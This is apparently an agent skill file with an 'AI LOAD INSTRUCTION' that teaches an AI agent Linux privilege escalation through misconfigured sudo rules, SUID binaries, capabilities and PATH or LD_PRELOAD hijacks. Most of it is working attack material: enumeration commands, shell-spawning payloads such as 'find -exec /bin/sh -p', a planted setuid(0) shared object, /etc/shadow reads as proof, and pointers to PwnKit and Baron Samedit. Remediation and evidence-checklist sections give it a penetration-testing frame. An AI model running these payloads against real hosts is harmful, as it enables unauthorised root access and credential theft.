---
name: linux-privesc-gtfobins-master
description: >-
  Linux privilege escalation via misconfigured sudo/suid/capabilities on legitimate binaries.
  Use when an unprivileged shell exists and enumerating for a root path. Covers context
  discovery, binary selection by permission context, and the escalation decision tree.
---

# SKILL: Linux Privesc — Legitimate Binary Abuse (GTFOBins Class)

> **AI LOAD INSTRUCTION**: An unprivileged shell is not a finding — a root shell is. This skill
> covers the fastest path there on most Linux hosts: a legitimate binary that the operator can
> run with elevated rights. The technique space is large (478 documented Unix binaries with
> confirmed privilege-transition capability) so **the skill is the decision tree, not the list**.
> Enumerate the context first, then select the binary. Never guess a payload before you know
> whether the vector is `sudo`, `suid`, or `capabilities`.

## 0. RELATED ROUTING

- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) — full Linux privesc taxonomy (kernel, cron, service, path)
- [linux-postexploit](../linux-postexploit/SKILL.md) — after root
- [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md) — the payloads the shell-class binaries spawn
- [linux-security-bypass](../linux-security-bypass/SKILL.md) — AppArmor/SELinux/capability interactions
- [living-off-the-land-lotl](../../core-subjects/living-off-the-land-lotl.md) — the doctrine behind using native binaries

---

## 1. THE THREE CONTEXTS

Every escalation in this class is one of three. Establish which before anything else.

| Context | What it means | First command | Typical success rate |
|---|---|---|---|
| **`sudo`** | you may run a specific binary as root, possibly with a password you don't have | `sudo -l` | highest — the rule is explicit |
| **`suid`** | binary has the SUID bit; it runs as its owner (usually root) regardless of caller | `find / -perm -4000 -type f 2>/dev/null` | high, but modern distros strip dangerous bits |
| **`capabilities`** | binary carries a file capability, e.g. `cap_setuid+ep` | `getcap -r / 2>/dev/null` | narrow but powerful; rarer than the other two |

**`sudo -l` is the single highest-value command on a Linux host you have any shell on.** Run it
first, always. A single `(ALL) NOPASSWD: /usr/bin/find` line is game over.

---

## 2. ENUMERATION — CONTEXT DISCOVERY

```text
# 1. what may I run, and as whom?
sudo -l
sudo -l -U <user>                     # another user's rules, if permitted

# 2. SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# 3. SGID (group escalation, then re-run step 2 as that group)
find / -perm -2000 -type f 2>/dev/null

# 4. file capabilities
getcap -r / 2>/dev/null                # requires libcap; else:
find / -type f -exec getcap {} \; 2>/dev/null

# 5. writable files owned by root or a privileged group (PATH hijack surface)
find / -writable -type d 2>/dev/null   | grep -v proc
find / -perm -o+w -type f 2>/dev/null

# 6. sudo version — some versions have direct CVEs (see §6)
sudo --version
```

**Automate, then verify manually.** For one bounded step, a targeted wrapper is appropriate:

```bash
for b in $(find / -perm -4000 -type f 2>/dev/null); do
  echo "== $b"; "$b" --help 2>&1 | head -3
done
```

Do not rely on the wrapper's classification — confirm the specific payload by hand before
running it. A wrong guess on a live host is noise that costs you the window.

---

## 3. SELECTION — WHICH BINARY

Once the context is known, select by **what the binary can do**, not by name recognition.
Documented classes, in order of exploit value:

| Class | What you get | Representative binaries |
|---|---|---|
| **shell** | an interactive shell at the elevated privilege | `find`, `awk`, `vi`/`vim`, `less`, `more`, `nmap`, `perl`, `python`, `ruby`, `node`, `env`, `make`, `gdb`, `tar` |
| **command** | arbitrary command execution | `awk`, `sed`, `find`, `env`, `make`, `git`, `tar`, `zip`, `rsync` |
| **file-read** | read any file as the elevated user | `cat`, `dd`, `head`, `tail`, `less`, `nl`, `od`, `pg`, `sort`, `awk`, `cp`, `tar` |
| **file-write** | write any file as the elevated user | `tee`, `dd`, `cp`, `mv`, `sed`, `awk`, `find -fprintf`, `vi`/`vim` |
| **library-load** | load an arbitrary shared object → code execution in the privileged process | `python` (ctypes), `perl`, `ruby`, `php`, `node` |
| **inherit** | the elevated process keeps the caller's environment → inject via env vars | `env`, `sudo` wrappers, `nice`, `timeout`, `xargs`, `stdbuf` |
| **reverse-shell / bind-shell** | direct network shell | `python`, `perl`, `ruby`, `node`, `nc`, `socat`, `php`, `lua` |
| **upload / download** | move files across the privilege boundary | `curl`, `wget`, `scp`, `ftp`, `nc`, `rsync` |

**Selection heuristic:**
1. Context is `sudo` with a **specific** binary → that binary, nothing else.
2. Context is `suid` → prefer **shell** class; check the binary drops privileges first (§4).
3. Context is `capabilities` → check for `cap_setuid+ep` (instant uid 0) before anything else.
4. No obvious hit → look at **`inherit`** class and **PATH hijack** (§5).

For the payload itself: more than 200 Unix binaries are documented as shell-capable. Rather than
memorise a list, reason from the binary's own features — a binary that can spawn a subprocess
(for the `shell` and `command` classes) can usually be made to spawn your shell.

---

## 4. THE PRIVILEGE-DROP PITFALL

Modern SUID binaries frequently drop privileges before executing user-controlled input. A
payload that works on an old distro silently fails here.

**Test:** run the candidate, then `id`. If you get your original uid back, the binary dropped.

```bash
# find: works when find does NOT drop privs
find . -exec /bin/sh \; -quit
# if privs were dropped, force them to be retained
find . -exec /bin/sh -p \; -quit
```

The `-p` flag tells `sh` to preserve the effective uid. Some binaries need a different
mechanism (e.g. `bash -p`, or `perl -e 'exec "/bin/sh";'`). The rule: **check `id` after every
attempt** and adjust the shell-invocation flag rather than abandoning the vector.

---

## 5. PATH HIJACK AND `inherit`

Two adjacent techniques that belong to this class because they exploit a **legitimate binary
invoked with elevated rights**.

**PATH hijack** — a SUID binary or sudo rule calls another program by relative name:

```bash
# target runs `service apache2 restart` as root; `service` is resolved via PATH
echo -e '#!/bin/sh\n/bin/sh -p' > /tmp/service
chmod +x /tmp/service
PATH=/tmp:$PATH /path/to/suid-binary
```

**`inherit`** — the elevated process retains environment variables the caller controls
(`LD_PRELOAD`, `LD_LIBRARY_PATH`, `PYTHONPATH`, `PERL5LIB`, custom config paths):

```bash
# LD_PRELOAD — blocked on SUID, but works for sudo wrappers and some callers
cat > /tmp/x.c <<'EOF'
void _init(){ setuid(0); system("/bin/sh -p"); }
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c
LD_PRELOAD=/tmp/x.so /path/to/privileged-binary
```

`LD_PRELOAD` is stripped for SUID/SGID binaries on every modern glibc — if it appears to work,
you are actually in a different context (a sudo rule, or a non-SUID caller). Confirm where the
privilege is coming from before reporting the finding.

---

## 6. VERSION-BASED FALLBACK

If no binary, capability, or PATH issue exists, check for a **vulnerable version** of a
privileged binary:

```bash
sudo --version          # CVE-2021-3156 (Baron Samedit), CVE-2019-14287 (-u#-1)
pkexec --version        # CVE-2021-4034 (PwnKit) — polkit, extremely common
uname -a                # kernel → CVE database by version
```

PwnKit and Baron Samedit are worth checking on every host: both are extremely widespread and
both give instant root. They are version-gated, so `--version` output decides whether the
attempt is worth making.

---

## 7. CONFIRMING THE FINDING
Privilege escalation's rule: **read the identity from INSIDE the elevated invocation, and with
capabilities the uid may not change.** This table is the gate.

| Step | Question | What it proves |
|---|---|---|
| 1 | Was the **pre-escalation context** recorded: `id`, the groups, the capabilities, the kernel? | the baseline the difference is measured against |
| 2 | Did the elevated command **run and return its own identity**, not an inferred one? | `id` executed through the mechanism is the proof |
| 3 | Is the proof the **capability's effect** where uid does not change? | `cap_setuid` may leave uid alone while granting the power |
| 4 | Is there a **control**: the same command WITHOUT the sudo entry, SUID bit, or capability, failing? | the difference attributable to the misconfiguration |
| 5 | Was the **privilege-drop pitfall** avoided: is the shell actually elevated, or a root-uid shell lacking the capability? | a weaker, different finding is often mistaken for success |
| 6 | Is the **GTFOBin's version** recorded, and the technique confirmed against it? | GTFOBin behaviour is version-bound |
| 7 | Is the finding the **mechanism** (which entry), not the binary's name? | the fix is the entry, not the tool |

**An identity read from inside the elevated invocation, and a control without the misconfiguration.** A
SUID binary is an observation; an elevated `id` through a specific misconfigured entry is the finding.

---

---

## 8. EVIDENCE STANDARD

| Item | Why |
|---|---|
| output of `sudo -l` / `find -perm -4000` / `getcap -r /` | proves the configuration exists |
| the exact binary, the exact command, and the context | reproducibility |
| `id` before and after | proves the privilege transition — **not** merely that a shell opened |
| whether the binary dropped privileges and how you worked around it | a finding that names the real control |
| host, distro, kernel version | the config is version-specific |

**`id` before and after is the finding.** A shell that returns the same uid proves nothing.

---

## 9. REMEDIATION REFERENCE

1. **`sudo`** — replace blanket binary rules with purpose-built wrappers; never grant a shell-capable binary; set `Defaults use_pty` and `log_output`; require authentication for everything.
2. **SUID** — inventory all SUID binaries and remove the bit from any that do not need it; on modern distros the dangerous set is small and stable, so an allowlist is practical.
3. **Capabilities** — same treatment; `cap_setuid+ep` on any user-invocable binary is equivalent to SUID root.
4. **PATH** — never call binaries by relative name from privileged scripts; use absolute paths.
5. **Detection** — alert on `execve` of a SUID binary with a shell as the child; on `getcap`/`sudo -l` enumeration; on a new SUID bit appearing anywhere outside the package manager.
6. **Kernel** — patch cadence is the only control for §6; PwnKit sat unpatched in the wild for 12 years.

---

## 10. EXECUTION PRIMITIVES

Sections 2 and 3 give the enumeration and the selection logic; this section is **how to prove the
escalation**. The gtfobins catalogue tells you what a binary CAN do; it does not tell you that it does it
in this context. The proof is always **the effective identity read from the process, with a control showing
the same binary under a context where it should not elevate**.

### 9.1 The context, which decides whether the technique exists

```bash
# THE THREE CONTEXTS (section 1) each need a DIFFERENT proof, and each needs a baseline.
echo "=== 0. THE BASELINE: the current identity, recorded before anything ==="
id
printf '  CapEff:   '; grep CapEff /proc/self/status | awk '{print $2}'
printf '  CapPrm:   '; grep CapPrm /proc/self/status | awk '{print $2}'
printf '  NoNewPrivs: '; grep NoNewPrivs /proc/self/status | awk '{print $2}'
printf '  Seccomp:  '; grep Seccomp /proc/self/status | awk '{print $2}'
echo "  THIS IS THE CONTROL. An 'escalation' claim with no baseline identity is unverifiable, and a"
echo "  process already running as root is not an escalation at all."
echo
echo "=== 1. THE SUID/SGID CONTEXT: the effective uid must CHANGE ==="
echo "--- the candidates, with their ownership and mode ---"
find / -perm -4000 -type f 2>/dev/null | head -60 | while read -r b; do
  printf '  %-50s %s\n' "$b" "$(stat -c '%U:%G %a' "$b" 2>/dev/null)"
done
echo "  A SUID binary running as root: the proof is that ITS process reports uid=0."
echo "  THE MECHANICAL PROOF, which is not 'a shell appeared':"
echo "    <binary> -p -c 'id; cat /proc/self/status | grep -E \"^(Uid|Gid|CapEff)\"'"
echo "  and the SAME read before the binary must show YOUR uid. That pair is the finding."
echo
echo "=== 2. THE SUDO CONTEXT: the permitted command list is the finding's boundary ==="
sudo -n -l 2>/dev/null || echo "  (sudo -n -l not permitted; try 'sudo -l' with the password if in scope)"
cat <<'SUDO'
  the sudoers line's RESOLUTION is what matters, and the following are DIFFERENT findings:
    user ALL=(ALL) /usr/bin/vim            -> a full escalation via the editor's :! shell
    user ALL=(ALL) NOPASSWD: /bin/cat      -> a FILE READ as root, NOT a shell. Report the read.
    user ALL=(root) /usr/bin/find          -> find's -exec runs as root -> a shell
    user ALL=(ALL) /usr/bin/systemctl      -> service manipulation, which may or may not be a shell
    user ALL=(ALL) /usr/bin/apt            -> package manipulation, i.e. code execution as root
    user ALL=(ALL) !/usr/bin/passwd        -> a NEGATION; read the whole line
  THE PROOF: run the permitted command and READ the effective identity back. For a file-read
  command, read something only root can read and CAPTURE ITS CONTENTS - an 'ls' listing is not it.
SUDO
echo
echo "=== 3. THE CAPABILITY CONTEXT: capabilities are a different proof from uid ==="
getcap -r / 2>/dev/null | head -30 || echo "  (getcap unavailable)"
cat <<'CAPS'
  cap_setuid+ep on python/perl/node   -> setuid(0) IS the escalation. PROOF: the process's
                                         subsequent `id` reports uid=0, and CapEff retains the bits.
  cap_dac_read_search                 -> FILE READ, no uid change. PROOF: the file's CONTENTS.
  cap_dac_override                    -> file read AND write. PROOF: a read AND a created file.
  cap_sys_admin                       -> MOUNT and namespace operations. PROOF: a mount that appears.
  cap_net_raw / cap_net_admin         -> packet capture or routing. PROOF: a capture.
  cap_sys_ptrace                      -> process injection. PROOF: a read of the target's memory.
  IMPORTANT: with capabilities, `uid` may NOT change. A capability escalation whose proof is
  'uid=0' is testing the WRONG thing, and this is the most common misreport in this context.
  THE CORRECT PROOF IS THE CAPABILITY'S OWN EFFECT: the file read, the mount, the capture.
CAPS
```

**With capabilities the uid may not change, so the proof is the capability's own effect — reading the file,
the mount, the capture. Testing for `uid=0` there is the most common misreport in this context.**

### 9.2 The technique, executed with the identity read back

```bash
cat <<'EXEC'
  THE GENERAL SHAPE, for any gtfobins entry:
    1. establish the CONTEXT (9.1) and the BASELINE identity
    2. run the binary with the argument the catalogue specifies, and an `id` FIRST in the same
       command, so the identity is captured FROM THE ELEVATED PROCESS and not from your shell
    3. READ SOMETHING the baseline identity could not: a file's CONTENTS (an /etc/shadow read is
       the canonical one), a mount that appeared, a capture
    4. THE CONTROL: run the SAME binary WITHOUT the configured privilege (as an ordinary exec of
       the same path) and show the SAME read FAILS

  WHY STEP 2 MUST PUT `id` INSIDE THE COMMAND: a shell that appears may be YOUR shell. The
  canonical false positive here is a technique that spawns a pager or an editor whose `:!` runs
  in the ORIGINAL context because the binary dropped privilege. WHICH BRINGS US TO SECTION 4.
EXEC
echo
echo "=== THE PRIVILEGE-DROP PITFALL (section 4), mechanically tested ==="
echo "  many binaries drop privileges BEFORE executing a child (setuid(), setgid(), and a capability"
echo "  drop). THE TEST:"
echo "    <binary> [technique] -c 'id'         and compare with"
echo "    <binary> [technique] -c 'cat /etc/shadow | head -1'"
echo "  if `id` shows root but the shadow read is denied -> the binary re-raised the restriction,"
echo "  and the 'shell' is a root-uid shell WITHOUT the capability or the group. THAT IS A FINDING"
echo "  of a different (weaker) kind, and it must be reported accurately."
echo
echo "  AND THE OTHER DIRECTION: if `id` shows YOUR uid, the technique did not elevate at all."
echo "  this is the single most common gtfobins false positive, and step 2 exists to catch it."
```

**A root-uid shell without the capability or group is a weaker, different finding and must be reported
accurately.** A shell showing your own uid means the technique never elevated, and step 2 exists to catch it.

### 9.3 PATH hijack, and the end-to-end harness

```bash
echo "=== THE PATH-HIJACK CONTEXT (section 5), with its precondition made explicit ==="
cat <<'PATH'
  THE PRECONDITION: the privileged binary invokes a helper BY BARE NAME (no absolute path) AND the
  caller can influence the search path. BOTH must hold.

  THE ARTEFACT: the binary you planted, with its path, its mode, and the identity of the process
  that EXECUTED it. THE CONTROL: the binary you did NOT plant must be the one executed.

  THE TWO TRAPS:
    a. `secure PATH` / `ENV_SUPATH` / an explicit `setenv` in the sudoers line REMOVES the
       influence. If the sudoers config sets secure_path, the hijack does not exist. READ THE LINE.
    b. `inherit` (in capability contexts) may NOT include the path set. Test whether the variable
       ACTUALLY reaches the child - print it from the child and show it.
  AND: a hijack where the helper is invoked by ANOTHER privileged process (a cron job, a service)
  is a DIFFERENT finding from one where you invoke it yourself. Name which.
PATH
echo
echo "=== the version-scoped fallback (section 6), stated as a scope not a defect ==="
echo "  some catalogue entries are version-scoped: `git --help` opening a pager, `tar`'s checkpoint"
echo "  action, and similar. RECORD THE VERSION and say whether the technique is version-bounded."
echo "  a technique that works on one version and not the next must be scoped to the tested version."
echo
echo "=== the end-to-end harness ==="
python3 - <<'PY'
print("=== LINUX PRIVESC (GTFOBINS) ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the BASELINE identity was recorded: uid, gid, CapEff, NoNewPrivs, Seccomp",
  "an escalation claim without a baseline is unverifiable, and already-root is not an escalation"),
 ("the CONTEXT is named: suid, sudo, or a capability - because the proof differs by context",
  "a capability escalation may not change uid at all"),
 ("for a SUID technique: the effective uid was read from INSIDE the elevated process, not from your shell",
  "the shell may be the analyst's own"),
 ("for a capability technique: the proof is the CAPABILITY'S EFFECT, not uid=0",
  "cap_dac_read_search changes no uid; testing uid is the most common misreport here"),
 ("for a sudo technique: the sudoers LINE was read, and a file-read-only grant is reported as a read",
  "a 'NOPASSWD: /bin/cat' grant is a file read, not a shell"),
 ("the PRIVILEGE-DROP pitfall was tested: `id` and a protected read in the SAME elevated invocation",
  "a root-uid shell without the capability or group is a different, weaker finding"),
 ("something was READ that the baseline identity could not, and its CONTENTS are captured",
  "an `ls` listing is not a protected read"),
 ("the SAME binary was run WITHOUT the privilege as the control, and the SAME read FAILED",
  "the privilege must be shown to be the variable"),
 ("for a PATH hijack: the bare-name invocation AND the path influence were both shown to hold",
  "secure_path removes the influence, and `inherit` may not carry the variable"),
 ("for a PATH hijack: the planting binary's path, mode, and executing identity are recorded",
  "the artefact and its control"),
 ("the tested VERSION is recorded where the technique is version-scoped",
  "some catalogue entries are version-bounded"),
 ("the GOAL is named: root identity, a protected file read, a mount, or a capture",
  "'we got a shell' without an identity read is not the finding"),
]
for n, how in CHECKS: print("  [ ] %-74s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  baseline : uid/gid/CapEff/NoNewPrivs/Seccomp before anything")
print("  context  : suid / sudo / capability, and the exact configuration line")
print("  technique: the argument used, with the identity read from inside the invocation")
print("  read     : the protected read's contents")
print("  control  : the same binary without the privilege failing the same read")
print("  scope    : the version, and a privilege-drop caveat if it applies")
PY
```

**Baseline, context, technique with the identity read inside the invocation, protected read, control, scope.**
The privilege-drop caveat is what keeps a root-uid shell from being reported as a full escalation.

---

## 11. RELATED SIBLINGS - LOAD TOGETHER

- [linux-security-bypass](../linux-security-bypass/SKILL.md) - the confinement layers a suid or capability path crosses
- [credential-access-atomic-tests](../credential-access-atomic-tests/SKILL.md) - the credential families that follow an escalation
- [sandbox-escape-techniques](../sandbox-escape-techniques/SKILL.md) - when the boundary is a container rather than a file mode
- [kernel-exploitation](../kernel-exploitation/SKILL.md) - the kernel-side route to the same identity
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) - the Windows counterpart of the use-it-not-possess-it rule
